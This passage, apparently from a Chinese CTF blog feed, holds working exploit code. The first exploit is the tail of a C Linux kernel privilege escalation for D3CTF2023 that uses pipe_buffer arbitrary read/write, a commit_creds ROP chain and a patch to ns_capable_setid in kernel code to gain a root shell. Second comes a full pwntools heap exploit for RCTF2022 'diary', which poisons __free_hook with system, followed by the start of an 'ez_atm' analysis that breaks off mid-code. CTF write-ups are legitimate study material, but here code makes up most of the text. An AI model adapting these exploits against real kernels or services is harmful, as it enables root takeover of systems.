pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">            pte_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PMD_ENTRY(stack_addr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">            pte_val = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PTE_ENTRY(stack_addr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line"></span><br><span class="line">            stack_addr_another = pte_val;</span><br><span class="line">            stack_addr_another &amp;= (~PAGE_ATTR_NX);</span><br><span class="line">            stack_addr_another += page_offset_base;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got another virt addr of kernel stack: \033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                   stack_addr_another);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ((<span class="number">0x1000</span> - <span class="number">0x100</span>) / <span class="number">8</span>); i++)</span><br><span class="line">            &#123;</span><br><span class="line">                rop[idx++] = RET + kernel_offset;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            rop[idx++] = POP_RDI_RET + kernel_offset;</span><br><span class="line">            rop[idx++] = INIT_CRED + kernel_offset;</span><br><span class="line">            rop[idx++] = COMMIT_CREDS + kernel_offset;</span><br><span class="line">            rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">54</span> + kernel_offset;</span><br><span class="line">            rop[idx++] = *(<span class="keyword">size_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">            rop[idx++] = *(<span class="keyword">size_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">            rop[idx++] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">            rop[idx++] = user_cs;</span><br><span class="line">            rop[idx++] = user_rflags;</span><br><span class="line">            rop[idx++] = user_sp;</span><br><span class="line">            rop[idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">uint64_t</span> stack_page = direct_map_addr_to_page_addr(stack_addr_another);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Hijacking current task&#x27;s stack...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">            arbitrary_write_by_pipe((struct page *)(stack_page + <span class="number">0x40</span> * <span class="number">3</span>), rop, <span class="number">0xff0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading current task_struct...&quot;</span>);</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">size_t</span> current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)current_task_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            tsk_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">            stack_addr = tsk_buf[<span class="number">4</span>];</span><br><span class="line">            mm_struct_addr = tsk_buf[<span class="number">292</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] kernel stack&#x27;s addr:\033[0m0x%lx\n&quot;</span>, stack_addr);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s addr:\033[0m0x%lx\n&quot;</span>, mm_struct_addr);</span><br><span class="line"></span><br><span class="line">            mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s page:\033[0m0x%lx\n&quot;</span>, mm_struct_page);</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((struct page *)mm_struct_page, buf);</span><br><span class="line">            arbitrary_read_by_pipe((struct page *)(mm_struct_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span> * <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">            mm_struct_buf = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)buf + (mm_struct_addr &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">            pgd_addr = mm_struct_buf[<span class="number">9</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got kernel page table of current task:\033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                   pgd_addr);</span><br><span class="line">        &#125;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> *kcode_map;</span><br><span class="line">            <span class="keyword">size_t</span> dst_paddr, dst_vaddr;</span><br><span class="line"></span><br><span class="line">            kcode_map = mmap((<span class="keyword">void</span> *)<span class="number">0x114514000</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                             MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (!kcode_map)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;FAILED to create mmap area!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                kcode_map[i] = <span class="string">&quot;0x196082&quot;</span>[i];</span><br><span class="line">                kcode_map[i + <span class="number">0x1000</span>] = <span class="string">&quot;0x196082&quot;</span>[i];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            dst_vaddr = NS_CAPABLE_SETID + kernel_offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] vaddr of ns_capable_setid is: \033[0m0x%lx\n&quot;</span>, dst_vaddr);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">size_t</span> pud_addr, pmd_addr;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">            pud_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PGD_ENTRY(dst_vaddr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">            pmd_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PUD_ENTRY(dst_vaddr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">            dst_paddr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PMD_ENTRY(dst_vaddr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line"></span><br><span class="line">            dst_paddr += <span class="number">0x1000</span> * PTE_ENTRY(dst_vaddr);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                   dst_paddr);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">size_t</span> pte_addr;</span><br><span class="line">            &#123;</span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">                pud_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PGD_ENTRY(<span class="number">0x114514000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">                pmd_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PUD_ENTRY(<span class="number">0x114514000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">                pte_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PMD_ENTRY(<span class="number">0x114514000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">                *(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PTE_ENTRY(<span class="number">0x114514000</span>)) = dst_paddr | <span class="number">0x8000000000000867</span>;</span><br><span class="line">                arbitrary_write_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf, <span class="number">0xff0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            &#123;</span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">                pud_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PGD_ENTRY(<span class="number">0x114514000</span> + <span class="number">0x1000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">                pmd_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PUD_ENTRY(<span class="number">0x114514000</span> + <span class="number">0x1000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">                pte_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PMD_ENTRY(<span class="number">0x114514000</span> + <span class="number">0x1000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">                *(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PTE_ENTRY(<span class="number">0x114514000</span> + <span class="number">0x1000</span>)) = (dst_paddr + <span class="number">0x1000</span>) | <span class="number">0x8000000000000867</span>;</span><br><span class="line">                arbitrary_write_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf, <span class="number">0xff0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Start overwriting kernel code segment...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * The setresuid() check for user&#x27;s permission by ns_capable_setid(),</span></span><br><span class="line"><span class="comment">             * so we can just patch it to let it always return true :)</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="built_in">memset</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>), <span class="string">&#x27;\x90&#x27;</span>, <span class="number">0x40</span>);</span><br><span class="line">            <span class="built_in">memcpy</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>) + <span class="number">0x40</span>,</span><br><span class="line">                   <span class="string">&quot;\xf3\x0f\x1e\xfa&quot;</span></span><br><span class="line">                   <span class="string">&quot;H\xc7\xc0\x01\x00\x00\x00&quot;</span></span><br><span class="line">                   <span class="string">&quot;\xc3&quot;</span>,</span><br><span class="line">                   <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger evil ns_capable_setid() in setresuid()...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">            setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            get_shell();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230524153518128.png"                      alt="image-20230524153518128"                ><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230524160032198.png"                      alt="image-20230524160032198"                ><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230524162232568.png"                      alt="image-20230524162232568"                ></p><h3 id="本人当时做的笨办法"><a href="#本人当时做的笨办法" class="headerlink" title="本人当时做的笨办法"></a>本人当时做的笨办法</h3><p>因为当时注意到存在<code>off by null</code>漏洞，第一反应就是利用<code>msg_msg</code>结构体来做这道题。属于是瞎猫碰到死耗子，我在没有考虑页级堆风水的情况下申请的<code>msg_msg</code>的<code>order</code>正好为3，也导致有一定的几率能够达到UAF的效果。自然，我的第一反应也是修改<code>cred</code>结构体，虽然能够成功找到但是成功率十分的低，每次调试需要手动跑二十多分钟，因为内存中有一大块存放着各种指针，导致无法继续往下搜索出现<code>kernel panic</code>，并且在改回普通用户权限后出现了这篇文章开头部分提到的<code>io_uring</code>的问题，所以也就放弃了这一方法。</p><p>然而，因为当时不清楚CFI的作用又跑去改ops去了，调了半天发现永远会在最后一步造成<code>panic</code>，并且也没有找到可以用来实现栈迁移的<code>gadget</code>，所以这个方法也被放弃了。刚刚结束比赛看了NULL的wp之后就觉得自己是真的太蠢了，分明可以直接修改<code>pipe_buffer</code>了居然没有想到<code>Dirty Pipe</code>，虽然墨晚鸢佬说这不是最优解，但是是我唯一能够做出来的方法我居然没想到，我是真的蠢！！！</p><hr><p>参考链接：</p><p>​    <a class="link"   href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/#Final-Exploitation" >https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/#Final-Exploitation<i class="fas fa-external-link-alt"></i></a></p><p>​    <a class="link"   href="https://elixir.bootlin.com/linux/v6.2.12/source" >https://elixir.bootlin.com/linux/v6.2.12/source<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img  
                     lazyload
                     src=&quot;/images/loading.svg&quot;
                     data-src=&quot;/images/image-20230510</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="msg_msg" scheme="https://cv196082.gitee.io/tags/msg-msg/"/>
    
    <category term="pipe_buffer" scheme="https://cv196082.gitee.io/tags/pipe-buffer/"/>
    
    <category term="io_uring" scheme="https://cv196082.gitee.io/tags/io-uring/"/>
    
    <category term="页级堆风水" scheme="https://cv196082.gitee.io/tags/%E9%A1%B5%E7%BA%A7%E5%A0%86%E9%A3%8E%E6%B0%B4/"/>
    
  </entry>
  
  <entry>
    <title>RCTF2022复现</title>
    <link href="https://cv196082.gitee.io/2023/04/22/RCTF2022%E5%A4%8D%E7%8E%B0/"/>
    <id>https://cv196082.gitee.io/2023/04/22/RCTF2022%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-04-22T05:35:06.000Z</published>
    <updated>2023-04-24T12:39:40.207Z</updated>
    
    <content type="html"><![CDATA[<h2 id="diary"><a href="#diary" class="headerlink" title="diary"></a>diary</h2><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>就是一道很正常的用户态堆题。在<code>delete</code>函数中存在UAF漏洞。</p><p>不过题目的逆向过程比较麻烦，加之我开始没注意到题目已经给了输入command的格式，如果注意到的话动态调试来逆向更为简单。</p><p>题目很简单，利用UAF使得<code>tcache</code>和<code>unsorted bin</code>中同时存在一个chunk，泄漏出libc地址。利用<code>encrypt</code>函数分配到<code>unsorted bin</code>中的chunk进而修改到tcache中chunk的fd指针指向<code>__free_hook</code>即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;add#1#1#1#1#1#&#123;&#125;#&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx), content)</span><br><span class="line">    payload = <span class="built_in">bytes</span>(payload, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;update#&#123;&#125;#&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx), content)</span><br><span class="line">    payload = <span class="built_in">bytes</span>(payload, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;show#&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx))</span><br><span class="line">    payload = <span class="built_in">bytes</span>(payload, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;delete#&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx))</span><br><span class="line">    payload = <span class="built_in">bytes</span>(payload, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">idx, offset, length</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;encrypt#&#123;&#125;#&#123;&#125;#&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx), <span class="built_in">str</span>(offset), <span class="built_in">str</span>(length))</span><br><span class="line">    payload = <span class="built_in">bytes</span>(payload, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    create(i, <span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(<span class="number">10</span>-i)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;1.1.1 1:1:4\n&#x27;</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x13a30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base:&quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line">update(<span class="number">3</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;1.1.1 1:1:4\n&#x27;</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base+<span class="number">0x1eee48</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;update#0#&#x27;</span> + flat(free_hook-<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">encrypt(<span class="number">0</span>, <span class="number">4</span>, <span class="number">6</span>)</span><br><span class="line">update(<span class="number">0</span>, <span class="string">&#x27;A&#x27;</span>*(<span class="number">0x2c0</span>-<span class="number">0x16</span>))</span><br><span class="line">create(<span class="number">40</span>, <span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;add#1#1#1#1#1#41#&#x27;</span>+flat(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>这道题我在下面这个位置这里破防了，一直无法<code>double free</code>我还以为是glibc中检查了又不报错，去翻了源码发现会有报错，这才看了题目这里居然有这样一个验证属于是有点儿恶心人了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">sub_43CC</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcmp</span>(*(<span class="keyword">const</span> <span class="keyword">void</span> **)(a1 + <span class="number">0x10</span>), <span class="string">&quot;    &quot;</span>, <span class="number">4uLL</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_4194</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)(a1 + <span class="number">0x10</span>) &amp;&amp; (<span class="keyword">unsigned</span> __int8)sub_43CC(a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)(a1 + <span class="number">0x10</span>) )</span><br><span class="line">      <span class="keyword">operator</span> <span class="keyword">delete</span>[](*(<span class="keyword">void</span> **)(a1 + <span class="number">0x10</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ez-atm"><a href="#ez-atm" class="headerlink" title="ez_atm"></a>ez_atm</h2><h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>题目难度依旧不是很大，但是我没想明白的是，一开始我可以gdb去调试服务端程序，但是后面却一直卡在accept了，有大佬知道的话可以留言告诉我一下怎么回事。也正是因为这道题目比较简单才可以在不调试的情况下直接打。</p><p>这道题逆向分析过程也不算很难，存在三处漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">stat_query</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  reply_message(<span class="number">1</span>, a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数中返回的依旧是<code>0x84</code>个字节，所以就可以读取到返回地址也就是libc上的地址了，从而拿到libc地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">query</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  reply_message(<span class="number">1</span>, user_list[user_id]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二处跟第一处类似，不同的是这里是越界读取堆上的内容，那么可以泄漏出堆地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span 